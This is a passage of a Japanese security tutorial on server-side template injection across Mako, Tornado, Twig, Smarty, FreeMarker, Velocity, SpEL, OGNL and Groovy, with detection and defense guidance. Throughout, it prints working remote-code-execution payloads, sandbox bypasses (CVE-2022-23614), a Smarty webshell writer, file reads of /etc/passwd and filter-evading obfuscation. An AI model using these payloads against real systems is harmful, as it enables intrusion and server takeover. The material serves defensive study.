- `self` はコンパイル済みテンプレートのネームスペースオブジェクト。`self.module` からMako内部モジュール（`mako.runtime`、`mako.cache` など）へたどれ、それらは実装上 `os` や `util` を参照している。**Jinja2の `__globals__` 経路と発想は同じ**（「内部モジュールがインポート済みの `os` を借用する」）だが、経由するモジュール名がMako固有である点が違う。
- `${self.__init__.__globals__['os'].system('id')}` はJinja2の最短ペイロードと構造的にそっくりで、テンプレートオブジェクトの `__globals__` に `os` が居ることを利用する。

数値難読化（`id` を文字コードで組む）も同じ発想で可能。

```mako
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

- `[105,100]` は `'i','d'` のASCIIコード。`chr()` で文字化し `join` で連結して `'id'` を生成する。ペイロード中に文字列 `id` が現れないためキーワードフィルタを回避する。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

---

### Tornado テンプレートのRCE経路

Tornado（TornadoフレームワークのテンプレートエンジンやTornado互換）は、**展開構文がJinja2と同じ `{{ }}`** という点が厄介で、検知時に混同しやすい。しかし内部挙動は大きく異なる。

```python
{{7*7}}      # → 49（検出）
{{7*'7'}}    # → Pythonの文字列反復。 '7777777'
```

Tornado最大の特徴は、**`{% %}` ブロック内で任意のPython文（`import` を含む）を実行できる**こと。したがって到達難度はMako同様に低い。

```jinja2
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

- `{% import os %}` でモジュールを取り込み、`{{ os.system(...) }}` で実行する。Jinja2のようにオブジェクトグラフをたどって `os` を「発掘」する必要がなく、`import` を直接書ける。
- 環境によっては `os` がテンプレート名前空間にあらかじめ露出していて、`{{os.system('whoami')}}` だけで通ることもある。

**検知上の実務ポイント**: `{{ }}` を見ただけでJinja2と決めつけず、`{% import ... %}`（Tornado/Jinja2双方にあるが用途が違う）や `${ }`（Mako）の有無、`7*'7'` の反応（`7777777` を返すのはPython系）で**エンジンを指紋採取（fingerprint）** してから、そのエンジン固有の危険パターンに絞ってルールを当てるのが正攻法である。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

---

### 3エンジン横断のまとめ（防御者の視点）

| 観点 | Jinja2 | Mako | Tornado |
|---|---|---|---|
| 展開構文 | `{{ }}` / `{% %}` | `${ }` / `<% %>` | `{{ }}` / `{% %}` |
| `import` 直書き | 不可（グラフ探索が必要） | 可（`<%import os%>`） | 可（`{%import os%}`） |
| 代表的sink到達経路 | `cycler/lipsum/joiner/namespace .__globals__.os` | `self.module...os` / `self.__init__.__globals__` | `os.system`（直接） |
| RCE難度 | 中（サンドボックス次第） | 低 | 低 |
| サンドボックス | `SandboxedEnvironment`あり（脱出研究多数） | 実質なし | 実質なし |

- **Jinja2の最短ペイロード最適化**が教えてくれる守りの要点は、「攻撃者は添字依存を捨て、`__globals__` 経由の**環境非依存かつ短い**普遍ペイロードを持っている」という前提でシグネチャを作ること。素朴に `__subclasses__` や特定インデックスだけを監視しても、`cycler.__init__.__globals__.os` 系や `lipsum.__globals__` 系を見落とす。
- **共通シグネチャ**として `__globals__`、`__init__.__globals__`、`__builtins__`、`__import__`、`popen`、`os.system`、そして4つのJinja2グローバル名（`cycler` `lipsum` `joiner` `namespace`）は高い識別力を持つ。ただし前述の `attr`/`format`/16進エンコードで難読化されうるため、**文字列マッチだけに頼らず、そもそもユーザー入力をテンプレートソースにしない**設計上の対策が根本策になる。
- エンジンの**指紋採取**（`${ }` の有無、`7*'7'` の応答など）を先に行い、エンジン固有の危険経路に絞ることで、誤検知を抑えつつ検知率を上げられる。

> 出典: GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2 — https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/
> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

## PHP(Twig/Smarty)とJava(FreeMarker/Velocity/SpEL)のSSTI

### 導入: なぜテンプレートエンジンが「実行環境」になるのか

SSTI(Server-Side Template Injection、サーバサイドテンプレートインジェクション)は、テンプレートエンジンが「表示用の文字列展開」だけでなく「式(expression)の評価」まで行えることに起因する脆弱性クラスである。多くのテンプレートエンジンは、ユーザー名や商品名をページに埋め込むだけでなく、`{{ user.name }}` のように条件分岐やフィルタ処理を書けるミニ言語(DSL)を内蔵している。この機能は本来「デザイナーがロジックを軽く書けるようにする」ためのものだが、もしテンプレート文字列そのものにユーザー入力が混入する箇所(sink、入力が最終的に実行・解釈される危険な代入先)があると、攻撃者は表示用の値ではなく「テンプレート言語のコード片」を注入できる。これは典型的には次のような実装ミスで起きる。

```python
# 脆弱な例(擬似コード): ユーザー入力をテンプレート文字列として扱ってしまう
template = Template("Hello " + user_input)
render(template)
```

正しくは `render(Template("Hello {{ name }}"), name=user_input)` のように、テンプレート構造とデータを分離しなければならない。SSTIはこの分離が崩れたときに発生し、最終的にはテンプレート言語からホスト言語(PHPやJava)のネイティブ関数・クラスに到達して任意コード実行(RCE)に至ることが多い。本節ではPHP系(Twig, Smarty)とJava系(FreeMarker, Velocity, SpEL/OGNL)の主要エンジンについて、検出から任意コード実行、サンドボックス回避までを仕組みレベルで解説する。

> ⚠️ 本節は防御・検知目的の解説である。実在サービスや本番環境に対する無許可の検証は行ってはならない。

---

### PHPテンプレートエンジンのSSTI

#### Twig

Twigはデフォルトで `{{ }}`(式の出力)と `{% %}`(制御構文)という2種類のデリミタを使う。SSTIの一次検出は非常にシンプルで、次のポリグロット的な数式を入力し、`49` という計算結果がそのまま出力されるかを確認する。

```twig
{{7*7}}
```

これが `49` として反映されれば、入力がテンプレートとしてコンパイル・評価されている証拠になる(単なるエスケープ漏れのXSSであれば `7*7` という文字列がそのまま出力される)。

デバッグ用フィルタ・関数を使うと内部状態を覗ける。

```twig
{{dump(app)}}
{{dump(_context)}}
```

`dump()` はTwigのデバッグ拡張が有効な場合に、現在のコンテキスト変数(リクエストオブジェクトなど)をダンプする。これにより攻撃対象システムの構成情報が漏れることがある。

ファイル読み取り・インクルードは次のように行える。

```twig
{{'/etc/passwd'|file_excerpt(1,30)}}
{{include("wp-config.php")}}
```

`include` はTwigの標準タグで、指定パスのファイルをテンプレートとして読み込む。これはパストラバーサルと組み合わせることで任意ファイルの内容取得や、条件次第ではファイル内のPHPコードとしての実行にもつながる。

**コード実行(標準関数呼び出し)**

Twigには任意のPHP呼び出し可能関数を渡せる `filter`/`map`/`reduce` などの高階フィルタがあり、`system` や `passthru` のようなOSコマンド実行関数を渡すとRCEになる。

```twig
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id']|filter('passthru')}}
```

これらが動く理由は、Twigの `filter`/`map`/`reduce` フィルタが「第2引数に渡された呼び出し可能な名前」をPHPの `call_user_func()` 相当の仕組みでそのまま呼び出すためである。つまりTwigの式言語からPHPのグローバル関数空間に直接橋渡しできてしまう。これを防ぐのがTwigの「サンドボックス拡張」であり、許可された関数・メソッド・プロパティ・フィルタのみをホワイトリストで許可する仕組みである。

**サンドボックスバイパス(CVE-2022-23614)**

Twigにはテンプレート作者を信頼できない場合のために `SandboxExtension` があるが、過去にはこのサンドボックスをすり抜けるバイパスが複数報告されている。CVE-2022-23614はTwigのサンドボックスにおいて、`sort` フィルタに渡すコールバック引数の扱いに起因する回避手法である。

```twig
{% set a = ["error_reporting", "1"]|sort("ini_set") %}
{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}
{{ ["id", 0]|sort("system") }}
{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%}
```

このペイロードの核心は、`sort()` フィルタの第2引数(比較関数名)が「サンドボックスの許可関数リスト」のチェックをすり抜けたまま、内部的には任意の関数名として呼び出される点にある。サンドボックスは「このフィルタ自体は許可されているか」は見るが、フィルタに渡される引数が「別の関数名の文字列」であることまで一貫してチェックしていなかったため、`system` のような危険な関数名を比較関数として渡すだけで実行に到達できてしまう。修正パッチはこの引数もサンドボックスのポリシーチェック対象に含めるよう改められた。

エラーベース(出力箇所がない場合)の実行や、ブラインドでの真偽判定にも工夫がある。

```twig
{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %}
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}}
```

`_self.env.registerUndefinedFilterCallback()` はTwig環境オブジェクトのメソッドで、「未定義のフィルタ名が呼ばれたときに、その名前をそのままコールバック(ここでは `shell_exec`)に渡して実行する」という挙動を登録する。つまり存在しないフィルタ `id && echo UniqueString` を呼び出すと、代わりに `shell_exec("id && echo UniqueString")` が実行される。この結果を `1/(...)` のようにゼロ除算エラーの有無に変換すれば、レスポンスに直接出力されない環境でもブラインドで真偽を判定できる(条件が偽ならゼロ除算例外が発生し、真ならしない、あるいはその逆になるようレスポンス差分を作る)。

**フィルタ/文字列検査回避のための難読化**

WAFや簡易なブラックリスト(`system`, `exec` などの文字列を単純に拒否するもの)を回避するため、文字列を分割・結合して構築する手法も知られている。

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

これは `id` と `passthru` という文字列を `000` という区切り文字を挟んだブロック変数として保持し、`split` で分解、`map` で組み立てて実行する、という一種の文字列分割難読化である。ブラックリスト方式の入力検査(単純な部分文字列マッチ)がいかに回避されやすいかを示す典型例であり、防御側は「danger関数名の文字列一致」ではなく「サンドボックス+ホワイトリスト」で守る必要があることの根拠になる。

> 出典: PayloadsAllTheThings — Server Side Template Injection / PHP.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md

#### Smarty

SmartyはTwigと異なりデリミタが単一の波括弧 `{ }` である(設定変更可能)。基本検出はバージョン情報の出力で行える。

```smarty
{$smarty.version}
```

**`{php}` タグによるRCE(廃止予定機能)**

Smartyには過去、テンプレート内に生のPHPコードを書ける `{php}` ブロックが存在した。

```smarty
{php}echo `id`;{/php}
```

これはテンプレートエンジンというより「PHPをそのまま実行する穴」であり、Smarty 3系以降は非推奨(deprecated)化され、設定でも明示的に無効化されている。しかし古いテンプレートやレガシー設定を引き継いだアプリケーションでは有効なままのことがあるため、依存関係の棚卸しの際に確認すべき項目である。

**組み込み関数経由のRCE**

Smartyのテンプレート構文はPHP関数の直接呼び出しに近い形をとれるため、次のような直接的な実行も可能である。

```smarty
{system('ls')}
```

さらに、Smartyの内部クラスのstaticメソッドを悪用してWebシェルをファイルシステムに書き込む高度な手口も報告されている。

```smarty
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

これはSmartyのテンプレートコンパイラ内部に存在する「ファイル書き込み」用のユーティリティメソッドを、本来の用途(コンパイル済みキャッシュファイルの書き出し)から外れて任意のパス・内容で呼び出すことで、Webルート配下にPHPのWebシェルを設置する手法である。テンプレートエンジンの脆弱性が「一度きりのコード実行」で終わらず、永続的なバックドア設置(persistence)にまで発展しうることを示す例である。

**難読化によるフィルタ回避**

```smarty
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

`chr()` でASCIIコードから1文字ずつ文字を組み立て、`array_map`/`implode` で関数名文字列(`chr` を繰り返し使うことで例えば `id` や `passthru` などの語)を動的に構築している。これも「危険な関数名を直接書かない」ことで、正規表現ベースの入力フィルタやWAFのシグネチャマッチを回避するための典型的な難読化パターンである。

> 出典: PayloadsAllTheThings — Server Side Template Injection / PHP.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md

#### 他のPHP系エンジンとの比較(参考)

同資料には、Laravel標準のBladeエンジンや、Latte、Plates(生PHPをテンプレートとして扱う軽量エンジン)についても言及がある。Bladeは内部的にPHPへコンパイルされるため、素のPHP関数呼び出しに近い形の難読化ペイロードがそのまま動くこと、Latteは `{php ...}` に相当する直接実行ブロックを持つことが特徴で、いずれも「テンプレート言語 → ホスト言語の関数呼び出し」という同じ攻撃面の広さの違いに帰着する。

---

### Javaテンプレートエンジン / 式言語のSSTI

Java系では「テンプレートエンジン」(FreeMarker, Velocity)と「式言語」(SpEL, OGNL, EL)の両方がSSTIの温床になる。式言語はSpring MVCのバリデーションエラーメッセージや、Struts2のOGNL、Thymeleafのリンク式(`@{}`)など、アプリケーションフレームワークの奥深くに組み込まれているため、注入経路が見つかりにくく、かつ影響が大きい。

#### FreeMarker

FreeMarkerの式は `${...}` が標準、`#{...}` はレガシー構文、`[=...]` はFreeMarker 2.3.4以降で使えるスクエアブラケット構文である。基本検出は次の通り。

```
${3*3}
```

FreeMarkerが持つ `freemarker.template.utility.Execute` というビルトインユーティリティクラスは、まさに「OSコマンドを実行してその出力を文字列として返す」ためのクラスであり、これがSSTIからRCEへの最短経路になる。

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()}
${"freemarker.template.utility.Execute"?new()("id && sleep 5")}
```

ここでの `?new()` はFreeMarkerの組み込みビルトインで、「文字列で指定したクラス名をインスタンス化する」という機能を持つ。つまりテンプレート言語の式の中から `new freemarker.template.utility.Execute()` 相当のオブジェクト生成ができてしまい、生成したインスタンスを関数のように呼び出すと `Runtime.exec()` 相当の処理でコマンドを実行する設計になっている。`Execute` クラスは本来「テンプレート内から安全に外部プロセスを呼びたい」というユースケースのために用意されたユーティリティだが、任意のユーザー入力がテンプレート文字列に混入する状況では、そのまま任意コマンド実行の入口になる。

フィルタで `id` や `Execute` のような文字列がブラックリスト化されている場合、FreeMarkerの `lower_abc` ビルトインで数値をアルファベットに変換する難読化が使える。

```
${9?lower_abc+4?lower_abc}
```

`?lower_abc` は数値を1=a, 2=b, ... のようにアルファベット文字へ変換するビルトインで、`9` は `i`、`4` は `d` になるため、文字列連結の結果 `"id"` が得られる。これを `Execute` クラス名の一部や引数文字列の構築に流用することで、単純な文字列一致ベースの検査を回避する。

**バージョン依存性**: 資料によれば、上記のようなサンドボックスバイパス系のテクニックはFreeMarker 2.3.30より前のバージョンでのみ機能するとされる。それ以降のバージョンではAPIの制限強化や `TemplateClassResolver` の既定動作変更などにより、任意クラスの `?new()` 生成が既定で制限される方向に修正が進んでいる(具体的な修正内容はデプロイ先のFreeMarökerバージョンのチェンジログで要確認)。したがって検知・防御を設計する際は、対象システムのFreeMarkerバージョンを必ず特定した上でリスク評価を行う必要がある。

#### Velocity

Velocityは `#set`, `#foreach`, `#include` などのディレクティブと `$変数` 参照からなる。Javaのリフレクションを介したコード実行の定番パターンは次の通り。

```java
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
#end
```

ここでの `$class.inspect("java.lang.Runtime")` はVelocity組み込みの `ClassTool`/`introspection`機構(あるいは類似のユーティリティ)を使い、クラス名の文字列から `java.lang.Class` オブジェクトを取得し、`.type` でリフレクション経由の型情報を得て `getRuntime().exec(...)` を呼び出す。Velocityの式言語自体は「メソッド呼び出し」を許すよう設計されているため、一度 `Runtime` クラスの参照を得られれば、そこから先はJavaのリフレクションAPIそのものであり、テンプレートエンジンのサンドボックスの有無に関わらず任意コード実行に直結する。出力を直接得にくいテンプレートでは、`$out.available()` の件数分だけ `#foreach` を回してストリームからバイト列を読み出す、という手作業でのI/O読み出しパターンも使われる。

ブラインド検出の手法としては、`#include()` を使ったファイル読み込みの成否によるエラーベース判定、コマンドの終了コードによる真偽判定(boolean-based)、`sleep` 相当のコマンドを実行させた際のレスポンス遅延を見る時間ベース判定、の3系統が定石として整理されている。これはSQLインジェクションのブラインド手法(エラー・真偽・時間)と同じ発想であり、「直接出力が返らないsinkでは何らかの副作用の差分を観測する」という考え方はSSTI全般に共通する。

#### SpEL(Spring Expression Language)/ EL / OGNL

SpELはSpringフレームワーク全体で使われる式言語で、Thymeleafなどのテンプレートエンジンと組み合わさることも多い。デリミタは文脈により複数存在する。

```
#{ }   ${ }   *{ }   @{ }   ~{ }
```

これらはそれぞれSpringの異なるサブシステム(SpEL式そのもの、プロパティプレースホルダ、Thymeleafの選択変数式・リンク式・フラグメント式など)に対応しており、SSTIの検出時にはどのデリミタが有効かをすべて試す必要がある。基本検出・環境変数の窃取は次の通り。

```java
${T(java.lang.Integer).valueOf('1')}
${T(java.lang.System).getenv()}
```

`T()` はSpELの「型演算子」で、完全修飾クラス名を与えると、そのクラスの `Class` オブジェクト(実質的にstaticメンバーへのアクセス起点)を取得できる。これによりテンプレート内の式から任意のJavaクラスのstaticメソッド・フィールドへ到達できるため、`T(java.lang.Runtime).getRuntime().exec(...)` のように直接プロセス起動へたどり着ける。

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

より汎用的な引数配列を使った実行や、リフレクションでメソッド配列のインデックスを直接指定して `exec` を呼ぶパターンもある。

```java
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(...)}
```

これは「クラス名の文字列がブロックされている場合でも、空文字列オブジェクトの `getClass().forName()` を経由すればクラス名を動的に解決できる」という迂回であり、さらに `getMethods()[6]` のようにメソッド一覧の固定インデックスで `exec` メソッドを呼び出す。インデックス番号はJavaのバージョンやクラスのメソッド宣言順に依存するため脆く、対象のJREバージョンに応じて調整が必要になる点に注意が必要である。

`ScriptEngineManager` 経由での実行は、Javaに標準搭載されているスクリプトエンジン(Nashornなど、JDKのバージョンによっては撤去済み)を呼び出してJavaScriptを実行させ、そこからさらにOSコマンドを呼ぶという二段構えの手口で、単純な `Runtime` ブラックリストを回避する目的で使われる。

ブラインド判定は次のような形で構成される。

```java
${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}
```

コマンドの終了コード(`waitFor()`)が0(成功)であれば `1/1` で正常値、そうでなければ `1/0` でゼロ除算エラーが発生する、という古典的なエラーベース/真偽ベースの複合手法である。

**OGNL(Object-Graph Navigation Language)** はStruts2などで使われる式言語で、静的メソッド呼び出しの記法がSpELと異なる。

```java
@java.lang.Integer@valueOf('1')
@java.lang.Runtime@getRuntime().exec("id")
```

`@クラス名@メンバ` という記法で静的メンバーにアクセスする点がOGNL特有の構文であり、Struts2の歴史的な重大脆弱性群(例えばContent-Typeヘッダ経由のOGNL式インジェクションなど)の多くは、この静的メソッドアクセス経路を通じて `Runtime.exec` にたどり着く形で成立していた。

**Groovy** はスクリプト言語そのものがテンプレート内に埋め込まれるケースで、`.execute()` のようにプロセス起動が言語組み込みメソッドとして提供されているため、リフレクションを介さずに直接コマンド実行できる点が他のJava式言語と異なる。

```groovy
${"calc.exe".execute()}
```

さらに `@ASTTest` アノテーションを使ったAST変換(コンパイル時にコード片を評価させる仕組み)を悪用したサンドボックス回避も報告されている。

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})def x }
```

これはGroovyのコンパイラが「コンパイルフェーズでテストアサーションを評価する」という機能を持つことを利用し、実行時のサンドボックス(メソッド呼び出しのホワイトリストなど)がまだ効いていないコンパイル時に任意コードを実行させる、という発想の異なるバイパスである。実行時のサンドボックスだけを見ていると、こうしたコンパイル時経路を見落としやすい。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Java.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md

---

### 仕組みの整理: なぜサンドボックスは破られ続けるのか

ここまでの事例を貫く共通原理は次の3点に整理できる。

1. **式言語とホスト言語の境界の薄さ**: Twigのフィルタ、FreeMarkerの `?new()`、SpELの `T()` 演算子、OGNLの `@クラス@メンバ` は、いずれも「テンプレート言語の式評価器から、ホスト言語(PHP/Java)のクラス・関数空間へ橋渡しする公式なAPI」である。これらは正規の機能として設計されているため、サンドボックスは「橋渡し自体を禁止する」のではなく「橋渡し先をホワイトリストで絞る」形にならざるを得ず、抜け穴が生まれやすい。
2. **文字列引数チェックの非対称性**: CVE-2022-23614のTwig事例が典型だが、「関数・フィルタ呼び出し自体は許可リストでチェックする」のに「その呼び出しに渡す引数(それ自体が別の関数名を意味する文字列)まではチェックしない」という非対称なチェック漏れが繰り返し発生している。防御コードをレビューする際は、許可リストが再帰的・網羅的に適用されているか(引数の中の関数名文字列まで検査対象か)を確認する必要がある。
3. **静的解析タイミングの盲点**: Groovyの `@ASTTest` の例のように、実行時のサンドボックスチェックだけを前提にしていると、コンパイル時・パース時に評価されてしまう機能(アノテーション処理、マクロ、静的初期化子など)を経由したバイパスは検知できない。サンドボックス設計では「いつコードが評価されるか」を全経路について洗い出す必要がある。

### 防御指針(まとめ)

- **最優先の対策はサンドボックスではなく「ユーザー入力をテンプレート文字列として結合しない」設計原則の徹底**である。テンプレートは常にコード側で固定文字列として用意し、ユーザー入力は変数(データ)としてのみ渡す。
- テンプレートエンジンにサンドボックス機能がある場合(Twigの`SandboxExtension`など)は最新版を使用し、既知のバイパス(CVE-2022-23614等)に対するパッチが適用されていることをバージョン管理で確認する。
- FreeMarkerでは `Execute` や `ObjectConstructor` のような危険なビルトインユーティリティクラスへのアクセスを制限する `TemplateClassResolver`/`APIBuiltinEnabled` 等の設定を明示的に無効化・制限する。
- SpEL/OGNLを利用するフレームワーク(Spring, Struts2等)では、フレームワーク自体のセキュリティアドバイザリを継続的に追跡し、既知のOGNL/SpELインジェクションCVEに対するパッチ適用状況を棚卸しする。
- ブラックリスト型の文字列フィルタ(危険関数名の禁止など)は本節で示した通り容易に難読化で回避されるため、根本対策にはならない。WAFはあくまで多層防御の一枚として扱い、単独の防御手段としないこと。

以上により、PHP系(Twig/Smarty)とJava系(FreeMarker/Velocity/SpEL/OGNL/Groovy)の主要なSSTIエンジンについて、検出・RCE到達・サンドボックス回避の仕組みと、それに対応する防御指針を整理した。

## FreeMarker SSTIの実例（CVE-2021-25770周辺）

### この節で学ぶこと

FreeMarkerはJavaベースのテンプレートエンジンで、Apache OFBiz、JetBrains YouTrack、Alfrescoなど多くのエンタープライズ製品でメール本文・帳票・管理画面のレンダリングに使われています。本節では、実際のバグバウンティ調査で確認されたSSTI（Server-Side Template Injection、サーバーサイドテンプレートインジェクション。ユーザー入力がテンプレートの構文としてそのまま解釈されてしまう脆弱性クラス）の発見手順から、`freemarker.template.utility.Execute` というsink（入力が最終的に危険な形で実行・解釈される代入先）クラスを悪用したRCE（リモートコード実行）への到達、そしてベンダーが導入したサンドボックス（テンプレートが呼び出せるJavaクラスを制限する防御機構）をバイパスした手口までを、仕組みのレベルで解説します。

### FreeMarurkerテンプレート言語の基礎とsinkの正体

FreeMarkerのテンプレートは `${...}` という**補間（interpolation）構文**の中に式（Expression）を書けます。これは本来「変数の値を文字列として埋め込む」ための機能ですが、FreeMarkerの式言語（FTL: FreeMarker Template Language）は単純な変数参照だけでなく、演算子・文字列結合・組み込み関数（ビルトイン、`?` で始まる後置演算子）・そして**クラスの動的インスタンス化**まで許してしまう強力な言語です。

攻撃者がテンプレート文字列そのものをアプリケーションに注入できる場合（典型的には、管理者がカスタマイズできる「メール通知テンプレート」「PDF帳票テンプレート」「Wikiページ」などの入力欄がテンプレートエンジンにそのまま渡される設計)、この式言語を悪用して任意のコードパスに到達できます。これがSSTIです。

まず攻撃者はエンジンの種類と、入力がテンプレートとして解釈されているかを確認するために、副作用のない式を送り込みます。

```
${"Hello " + "World"}
${7*7}
${.now?string("yyyy-MM-dd")}
```

これらが `Hello World`、`49`、現在日付として出力されれば、入力が確かにFreeMarkerの式として評価されていることが確定します（単なるテキスト置換であれば `${7*7}` はそのまま文字列として表示されるだけです）。これはSQLiにおける `' OR '1'='1` のような「まず存在を確認するプローブ」と同じ考え方です。

> 出典: Discovering a Server-Side Template Injection Vuln in FreeMarker — https://www.synack.com/exploits-explained/exploits-explained-discovering-a-server-side-template-injection-vuln-in-freemarker/

Synackの記事では、あるプログラムの管理者向け「メールテンプレート設定」機能のリッチテキストエディタにプレースホルダーが存在し、それがテンプレートレンダリングされている痕跡（プレースホルダーが特定の書式で置換される挙動）から着眼点を得ています。バグバウンティにおいてSSTIを疑うべき典型的な入口は、次のような「ユーザーがカスタマイズ可能な出力テンプレート」機能です。

- 通知メール・請求書・レポートの文面テンプレート編集機能
- 動的に生成されるWebページ／CMSのテーマ・レイアウト編集
- チャットボットやワークフローエンジンのメッセージテンプレート

### `freemarker.template.utility.Execute` というsink

存在確認ができたら、次はRCEへの到達経路を探します。FreeMarkerには、Javaのクラスをテンプレート内から動的にインスタンス化するための `new()` というビルトインが用意されています。これは本来、開発者がテンプレート内で独自の `TemplateModel` 実装（カスタムの整形ロジックなど）を呼び出すための正規機能ですが、任意のクラス名文字列に対して `new()` を適用できてしまうと、攻撃者はFreeMarkerが標準で同梱している**ユーティリティクラス群**を武器に変えられます。

その代表例が `freemarker.template.utility.Execute` です。このクラスはFreeMarker自身のユーティリティパッケージに含まれており、渡された文字列を **`Runtime.exec()`** 相当の仕組みでOSコマンドとして実行し、その標準出力をテンプレートの出力に埋め込む、という機能を持っています。つまり「テンプレートエンジンに標準で入っている、OSコマンド実行を目的としたクラス」がそのままRCE用のガジェット（攻撃者が目的を達成するために悪用する既存のコードパーツ）になっているのです。

Armaan Pathan氏の調査、および関連するCVE-2021-25770（FreeMarker 2.3.30より前のバージョンに存在する既知のサンドボックス回避手法で、JetBrains YouTrackなど複数製品に影響）の技術資料が示す基本ペイロードは次のとおりです。

```
${"freemarker.template.utility.Execute"?new()("id")}
```

```
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
```

**なぜこれで任意コマンド実行に至るのか**を分解すると、次の3段階になります。

1. `"freemarker.template.utility.Execute"` という文字列リテラルをFreeMarkerの式エンジンが評価する。
2. `?new()` ビルトインが、その文字列をJavaの完全修飾クラス名として解釈し、`Class.forName()` に相当する処理でクラスをロードし、リフレクション（実行時にクラス情報を調べてインスタンス化・メソッド呼び出しを行う仕組み）でデフォルトコンストラクタを呼び出してインスタンス化する。
3. 生成された `Execute` オブジェクトを、関数のように `("id")` という引数で呼び出す（FreeMarkerの `TemplateMethodModelEx` 実装は、テンプレート内で `obj(args)` という関数呼び出し構文をサポートする）。この呼び出しの内部で `Execute` クラスがOSのシェルにコマンドを渡し、実行結果の標準出力を文字列として返す。

この一連の流れが、テンプレートエンジンという「本来はデータの整形・表示だけを担うはずのコンポーネント」の中に、任意コード実行の経路が存在してしまう根本原因です。SSTIが「テンプレート版のコードインジェクション」と呼ばれる所以はここにあり、SQLiがパーサ（SQL構文解析器）にデータと制御構文の境界を誤らせる攻撃であるのに対し、SSTIはテンプレートエンジンの式パーサに同じ誤りをさせる攻撃だと理解すると、他のSSTI系脆弱性（Jinja2、Velocity、Thymeleafなど）にも応用が効きます。

### フィルタ回避:`?lower_abc` ビルトインを使った符号化バイパス

実運用のアプリケーションでは、`Execute` や `exec` といった危険な文字列をブラックリスト（WAFやアプリ側の入力フィルタ）で単純にブロックしていることがあります。Armaan Pathan氏の記事では、対象アプリが文字列フィルタリングを実装していたため、ペイロード中の禁止文字列をそのまま送ると弾かれる状況に直面しました。

ここで使われたのが `?lower_abc` というFreeMarkerの数値変換ビルトインです。これは数値を「a, b, c, ...」のアルファベット表記に変換する機能で、たとえば次のように動作します。

```
${6?lower_abc}
```

このビルトインは数値 `1` を `a`、`2` を `b`、…という具合に変換します（`6` であれば `f` が出力される、というように6番目のアルファベットを返す仕組みです）。この性質を使うと、禁止されている文字列 `Execute` を直接書く代わりに、各文字に対応する数値を `?lower_abc` で変換して文字列連結（`+` 演算子）することで、フィルタが検知するパターン（`Execute` という生の文字列や `exec(` というシグネチャ）に一致しない形でペイロードを組み立てられます。

**なぜこれが有効なのか**という点が本質です。多くの入力フィルタは「危険な文字列パターンをそのまま検出する」正規表現ベースの防御であり、テンプレート言語そのものの意味論（セマンティクス）までは解釈しません。つまりフィルタは「`Execute` という文字トークン列が入力中に存在するか」だけを見ており、「実行時にFreeMarkerのビルトインが文字列を動的に組み立てた結果が `Execute` になるかどうか」までは追跡できません。これは、SQLiにおける大文字小文字混在や16進エンコードによるWAF回避、あるいはXSSにおけるHTMLエンティティ・JavaScriptのUnicodeエスケープを使ったフィルタ回避と本質的に同じ原理です。**構文解析（パース）は実行時に行われるのに対し、多くのブラックリスト型フィルタは静的な文字列一致しか見ていない**というギャップが、あらゆる「エンコード系バイパス」の共通原因です。

このテクニックにより、`id`・`whoami`・`pwd` といったコマンド実行や、フィルタが直接ブロックしていた `Execute` クラス名そのものを、数値からアルファベットへの変換と文字列連結で間接的に再構成し、最終的に完全なRCEペイロードへ組み上げることに成功しています。

> 出典: Breaking the Barrier: Remote Code Execution via SSTI in FreeMarker Template Engine — https://medium.com/@armaanpathan/breaking-the-barrier-remote-code-execution-via-ssti-in-freemarker-template-engine-9797079752ac

> ⚠️ **アクセス補足**: 上記Medium記事は自動取得時にHTTP 403（アクセス拒否）が返され、直接の本文取得はできませんでした。本節の記述は、同記事を検索エンジン経由で要約した情報と、同一の手法（`freemarker.template.utility.Execute` の `?new()` 呼び出しおよび `?lower_abc` によるフィルタ回避）を扱う別の技術記事（blogs.sayaan.in「Exploiting Freemarker SSTI for Remote Code Execution」）を突き合わせて内容を検証したものです。正確な原文表現や追加のスクリーンショット等は、上記URLからご自身で直接ご確認ください。

### CVE-2021-25770とサンドボックス回避の文脈

